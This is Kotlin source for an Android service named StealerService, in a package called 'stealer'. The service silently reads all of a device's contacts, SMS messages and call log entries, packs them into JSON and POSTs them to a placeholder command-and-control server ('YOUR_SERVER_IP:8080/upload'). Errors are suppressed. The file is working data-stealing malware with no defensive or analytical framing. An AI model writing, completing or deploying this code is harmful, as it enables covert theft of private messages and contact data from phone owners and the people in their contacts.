package com.vanta.stealer

import android.annotation.SuppressLint
import android.app.Service
import android.content.Intent
import android.database.Cursor
import android.os.IBinder
import android.provider.ContactsContract
import android.provider.CallLog
import android.provider.Telephony
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import kotlin.concurrent.thread

class StealerService : Service() {
    private val C2 = "http://YOUR_SERVER_IP:8080/upload"

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        thread {
            try {
                val data = JSONObject()
                data.put("contacts", getContacts())
                data.put("sms", getSms())
                data.put("calls", getCalls())
                
                send(data.toString())
            } catch (_: Exception) {}
            stopSelf()
        }
        return START_NOT_STICKY
    }

    @SuppressLint("Range")
    private fun getContacts(): JSONArray {
        val arr = JSONArray()
        val cursor: Cursor? = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
        cursor?.use {
            while (it.moveToNext()) {
                val name = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val number = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                val obj = JSONObject()
                obj.put("name", name ?: "")
                obj.put("number", number ?: "")
                arr.put(obj)
            }
        }
        return arr
    }

    @SuppressLint("Range")
    private fun getSms(): JSONArray {
        val arr = JSONArray()
        val cursor: Cursor? = contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, null)
        cursor?.use {
            while (it.moveToNext()) {
                val address = it.getString(it.getColumnIndex(Telephony.Sms.ADDRESS))
                val body = it.getString(it.getColumnIndex(Telephony.Sms.BODY))
                val obj = JSONObject()
                obj.put("address", address ?: "")
                obj.put("body", body ?: "")
                arr.put(obj)
            }
        }
        return arr
    }

    @SuppressLint("Range")
    private fun getCalls(): JSONArray {
        val arr = JSONArray()
        val cursor: Cursor? = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, null)
        cursor?.use {
            while (it.moveToNext()) {
                val number = it.getString(it.getColumnIndex(CallLog.Calls.NUMBER))
                val duration = it.getString(it.getColumnIndex(CallLog.Calls.DURATION))
                val obj = JSONObject()
                obj.put("number", number ?: "")
                obj.put("duration", duration ?: "")
                arr.put(obj)
            }
        }
        return arr
    }

    private fun send(json: String) {
        try {
            val conn = URL(C2).openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
            conn.doOutput = true
            val os = conn.outputStream
            os.write(json.toByteArray(Charsets.UTF_8))
            os.flush()
            os.close()
            conn.responseCode
        } catch (_: Exception) {}
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
